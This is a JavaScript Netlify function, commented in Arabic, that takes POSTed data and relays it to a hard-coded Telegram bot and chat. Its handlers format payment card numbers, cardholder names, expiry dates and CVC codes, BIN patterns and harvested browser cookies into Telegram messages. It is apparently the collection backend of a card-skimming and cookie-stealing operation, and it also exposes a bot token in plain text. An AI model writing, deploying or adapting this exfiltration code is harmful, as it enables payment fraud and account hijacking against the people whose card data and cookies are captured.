// دالة Netlify محدثة - 10 رسائل لكل جهاز في الدقيقة
const axios = require('axios');

// بيانات البوت (بدون تشفير مؤقتاً)
const BOT_TOKEN = '7998856652:AAEl-384RB1b_uOOc8wJ2pdzc5hmgpUoRjU';
const CHAT_ID = '664193835';

// نظام Rate Limiting - 10 رسائل لكل جهاز في الدقيقة
const rateLimitStore = new Map();
const deviceSessions = new Map();
const blockedDevices = new Set();

// التحقق من Rate Limiting
function checkRateLimit(deviceFingerprint) {
  const now = Date.now();
  const oneMinute = 60 * 1000;
  
  const deviceData = rateLimitStore.get(deviceFingerprint) || {
    requests: [],
    blocked: false,
    blockTime: 0
  };
  
  // إزالة الطلبات القديمة
  deviceData.requests = deviceData.requests.filter(time => now - time < oneMinute);
  
  // التحقق من عدد الطلبات
  if (deviceData.requests.length >= 10) {
    deviceData.blocked = true;
    deviceData.blockTime = now;
    rateLimitStore.set(deviceFingerprint, deviceData);
    
    return {
      allowed: false,
      reason: 'تم تجاوز حد الطلبات (10 رسائل في الدقيقة)',
      remainingTime: 300
    };
  }
  
  // إضافة الطلب الحالي
  deviceData.requests.push(now);
  rateLimitStore.set(deviceFingerprint, deviceData);
  
  return {
    allowed: true,
    remainingRequests: 10 - deviceData.requests.length,
    resetTime: Math.ceil((oneMinute - (now - deviceData.requests[0])) / 1000)
  };
}

// التحقق من صحة الطلب
function validateRequest(body) {
  const { signature, timestamp, deviceFingerprint, sessionKey } = body;
  
  if (!signature || !timestamp || !deviceFingerprint || !sessionKey) {
    return { valid: false, reason: 'بيانات غير مكتملة' };
  }
  
  // التحقق من الوقت
  const requestTime = parseInt(timestamp);
  const currentTime = Date.now();
  if (currentTime - requestTime > 5 * 60 * 1000) {
    return { valid: false, reason: 'طلب منتهي الصلاحية' };
  }
  
  // التحقق من الحظر
  if (blockedDevices.has(deviceFingerprint)) {
    return { valid: false, reason: 'الجهاز محظور' };
  }
  
  // التحقق من Rate Limiting
  const rateLimitCheck = checkRateLimit(deviceFingerprint);
  if (!rateLimitCheck.allowed) {
    return { 
      valid: false, 
      reason: rateLimitCheck.reason,
      remainingTime: rateLimitCheck.remainingTime
    };
  }
  
  return { 
    valid: true, 
    rateLimit: rateLimitCheck 
  };
}

// دالة Netlify الرئيسية
exports.handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, X-Device-Fingerprint, X-Session-Key, X-Timestamp, X-Signature',
    'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
    'Content-Type': 'application/json'
  };
  
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  
  try {
    // معالجة GET request
    if (event.httpMethod === 'GET') {
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          success: true,
          message: 'API يعمل بنجاح',
          environment: 'Netlify Functions',
          rateLimit: '10 رسائل لكل جهاز في الدقيقة'
        })
      };
    }
    
    const body = JSON.parse(event.body);
    const { data, deviceFingerprint, sessionKey, signature, timestamp } = body;
    
    // التحقق من صحة الطلب
    const validation = validateRequest(body);
    if (!validation.valid) {
      return {
        statusCode: 429,
        headers,
        body: JSON.stringify({
          error: validation.reason,
          code: 'RATE_LIMIT_EXCEEDED',
          remainingTime: validation.remainingTime || 0
        })
      };
    }
    
    // تنسيق الرسالة
    let formattedMessage = '';
    const messageTimestamp = new Date().toLocaleString('ar-SA');
    
    switch (data.type) {
      case 'card':
        formattedMessage = `🔔 نتيجة ربط البطاقة
✅ تم الربط بنجاح
رقم البطاقة: ${data.message.number}
الاسم: ${data.message.name}
التاريخ: ${data.message.expiry}
CVC: ${data.message.cvc}
⏰ الوقت: ${messageTimestamp}
🌐 البيئة: Netlify Functions
📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
        break;
        
      case 'bin':
        formattedMessage = `💳 تم إضافة BIN جديد
🔢 BIN Pattern: ${data.message.pattern}
📝 الاسم: ${data.message.name || 'غير محدد'}
${data.message.cardNumber ? `💳 رقم البطاقة: ${data.message.cardNumber}` : ''}
${data.message.expiryDate ? `📅 تاريخ الانتهاء: ${data.message.expiryDate}` : ''}
${data.message.cvc ? `🔐 CVC: ${data.message.cvc}` : ''}
⏰ الوقت: ${messageTimestamp}
🌐 البيئة: Netlify Functions
📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
        break;
        
      case 'cookies':
        formattedMessage = `🍪 تم إضافة Cookies جديدة
📝 الرسالة: ${data.message}
🌐 الرابط: ${data.url || 'غير محدد'}
🍪 عدد Cookies: ${data.cookies ? Object.keys(data.cookies).length : 0}
⏰ الوقت: ${messageTimestamp}
🌐 البيئة: Netlify Functions
📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
        break;
        
      case 'message':
        formattedMessage = `${data.message}
⏰ الوقت: ${messageTimestamp}
🌐 البيئة: Netlify Functions
📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
        break;
        
      default:
        formattedMessage = `${JSON.stringify(data, null, 2)}
⏰ الوقت: ${messageTimestamp}
🌐 البيئة: Netlify Functions
📊 الطلبات المتبقية: ${validation.rateLimit.remainingRequests}`;
    }
    
    // إرسال الرسالة إلى تليجرام
    try {
      const telegramResponse = await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          chat_id: CHAT_ID,
          text: formattedMessage,
          parse_mode: 'HTML'
        },
        {
          timeout: 10000,
          headers: { 'Content-Type': 'application/json' }
        }
      );
      
      if (telegramResponse.data.ok) {
        return {
          statusCode: 200,
          headers,
          body: JSON.stringify({
            success: true,
            message: 'تم إرسال الرسالة بنجاح',
            message_id: telegramResponse.data.result.message_id,
            environment: 'Netlify Functions',
            rateLimit: {
              remainingRequests: validation.rateLimit.remainingRequests,
              resetTime: validation.rateLimit.resetTime
            }
          })
        };
      } else {
        return {
          statusCode: 500,
          headers,
          body: JSON.stringify({
            error: 'فشل في إرسال الرسالة إلى تليجرام',
            code: 'TELEGRAM_ERROR',
            details: telegramResponse.data
          })
        };
      }
    } catch (telegramError) {
      console.error('خطأ في تليجرام:', telegramError.response?.data || telegramError.message);
      
      // معالجة خطأ Rate Limiting من تليجرام
      if (telegramError.response?.status === 429) {
        // إضافة تأخير أطول لتقليل الضغط
        const retryAfter = telegramError.response.headers['retry-after'] || 60;
        
        return {
          statusCode: 429,
          headers,
          body: JSON.stringify({
            error: 'تليجرام يتعرض لضغط عالي، حاول لاحقاً',
            code: 'TELEGRAM_RATE_LIMIT',
            details: 'Telegram is experiencing high load',
            retryAfter: parseInt(retryAfter),
            message: `انتظر ${Math.ceil(retryAfter / 60)} دقيقة قبل المحاولة مرة أخرى`
          })
        };
      }
      
      // معالجة أخطاء أخرى من تليجرام
      if (telegramError.response?.status >= 500) {
        return {
          statusCode: 503,
          headers,
          body: JSON.stringify({
            error: 'تليجرام غير متاح حالياً، حاول لاحقاً',
            code: 'TELEGRAM_UNAVAILABLE',
            details: telegramError.message,
            retryAfter: 120,
            message: 'انتظر دقيقتين قبل المحاولة مرة أخرى'
          })
        };
      }
      
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'خطأ في الاتصال بتليجرام',
          code: 'TELEGRAM_ERROR',
          details: telegramError.message
        })
      };
    }
    
  } catch (error) {
    console.error('خطأ في دالة Netlify:', error);
    
    // معالجة أخطاء JSON parsing
    if (error instanceof SyntaxError) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'بيانات JSON غير صحيحة',
          code: 'INVALID_JSON',
          details: error.message
        })
      };
    }
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'خطأ داخلي في الخادم',
        code: 'INTERNAL_ERROR',
        details: error.message
      })
    };
  }
};

// دالة للحصول على إحصائيات
exports.getStats = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, OPTIONS'
  };
  
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  
  try {
    const stats = {
      totalDevices: deviceSessions.size,
      blockedDevices: blockedDevices.size,
      rateLimitedDevices: Array.from(rateLimitStore.entries()).filter(([_, data]) => data.blocked).length,
      environment: 'Netlify Functions',
      timestamp: new Date().toISOString()
    };
    
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        stats: stats
      })
    };
    
  } catch (error) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'خطأ داخلي في الخادم',
        code: 'INTERNAL_ERROR'
      })
    };
  }
}; 